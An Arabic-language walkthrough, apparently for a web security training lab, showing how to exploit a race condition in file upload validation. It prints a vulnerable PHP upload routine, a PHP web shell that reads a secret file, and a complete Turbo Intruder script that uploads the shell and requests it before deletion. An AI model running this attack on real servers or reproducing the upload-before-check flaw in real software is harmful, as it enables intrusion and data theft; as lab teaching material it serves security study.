

# Lab: Web Shell Upload via Race Condition 🏁

---

## أولاً: الفكرة من الأساس — إيه هو الـ Race Condition؟

تخيل عندك باب أوتوماتيكي بيقفل بعد 2 ثانية من الفتح.

لو دخلت خلال الـ 2 ثانية دول — عدّيت. لو اتأخرت — الباب اتقفل وما عدّيتش.

**نفس الفكرة بالظبط في الـ lab ده:**

الـ server بيعمل الخطوات دي بالترتيب:

```
1. يستقبل الـ file ويحطه على الـ disk مباشرةً ✅
          ↓
2. يعمل virus check + file type check ⏳ (بياخد وقت)
          ↓
3. لو الـ file مش image → يمسحه ❌
```

**المشكلة:** في الخطوة 1، الـ file بقى موجود على الـ disk ويمكن الوصول إليه — قبل ما الـ check يخلص!

فلو بعتنا **GET request للـ file** في نفس اللحظة اللي اتحط فيها على الـ disk وقبل ما يتمسح — هنلاقيه موجود وهيتـ execute!

---

## ثانياً: الـ Code اللي فيه المشكلة

```php
// الخطوة 1: حط الـ file على الـ disk فوراً ⚠️
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

// الخطوة 2: بعدين فضل تعمل checks (بياخد وقت)
if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "uploaded";
} else {
    unlink($target_file); // امسح الـ file لو مش image
}
```

الـ window الزمنية:

```
[File على الـ disk] ←-- نطة هنا --→ [File اتمسح]
       ↑                                    ↑
   اتحط هنا                          الـ check خلص
```

---

## ثالثاً: الخطوات العملية

---

### 🔹 الخطوة 1: جهّز الـ exploit

```bash
echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > exploit.php
```

---

### 🔹 الخطوة 2: Login وجرب ترفع الـ file

- ادخل الـ lab بـ `wiener:peter`
- روح **My Account**
- جرب ترفع `exploit.php` — هيرفض طبعاً
- **المهم:** Burp بيسجل الـ POST request دي

---

### 🔹 الخطوة 3: افتح Turbo Intruder

في Burp:

- روح **Proxy → HTTP History**
- لقي الـ `POST /my-account/avatar` request
- كليك يمين → **Extensions → Turbo Intruder → Send to Turbo Intruder**

---

### 🔹 الخطوة 4: اعمل الـ Script

في Turbo Intruder، احذف الكود الموجود وحط الكود ده:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: <YOUR-LAB-ID>.web-security-academy.net
Cookie: session=<YOUR-SESSION>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--'''

    request2 = '''GET /files/avatars/exploit.php HTTP/2
Host: <YOUR-LAB-ID>.web-security-academy.net
Cookie: session=<YOUR-SESSION>

'''

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

**مش محتاج تكتب الـ requests دي يدوياً** — هقولك إزاي تاخدهم من Burp في الخطوة الجاية.

---

### 🔹 الخطوة 5: جيب الـ Requests الصح من Burp

**الـ POST request:**

- في Turbo Intruder، في الأعلى هتلاقي الـ POST request جاهزة
- انسخها وحطها في `request1`

**الـ GET request:**

- روح Proxy History
- لقي أي `GET /files/avatars/<image>` request
- انسخه وغيّر اسم الـ file لـ `exploit.php`
- حطه في `request2`

---

### 🔹 الخطوة 6: شغّل الـ Attack

- اضغط **Attack**
- Turbo Intruder هيبعت:
    - POST واحد يرفع الـ exploit.php
    - 5 GET requests في نفس اللحظة بالظبط

```
POST (upload) ─┐
GET #1        ─┤
GET #2        ─┤→ كلهم بيوصلوا للـ server في نفس اللحظة
GET #3        ─┤
GET #4        ─┤
GET #5        ─┘
```

---

### 🔹 الخطوة 7: شوف النتايج

في الـ results table:

- معظم الـ GET requests هياخدوا **404** (الـ file اتمسح)
- بس **1 أو 2 منهم** هياخدوا **200** فيه الـ secret!

```
200 OK → <secret_here>   ✅
404 Not Found            ❌
404 Not Found            ❌
200 OK → <secret_here>   ✅
404 Not Found            ❌
```

---

## ملخص الهجمة

```
الـ server بيحط الـ file على الـ disk الأول
        ↓
File موجود لثوانٍ قليلة قبل الـ validation
        ↓
احنا بنبعت GET في نفس اللحظة
        ↓
لو الـ GET وصل قبل الـ delete → PHP اشتغل وجاب الـ secret
```

---

جرب الخطوات وقولي وين وصلت أو لو Turbo Intruder مش موجود عندك نحله 💪

</div>

</div>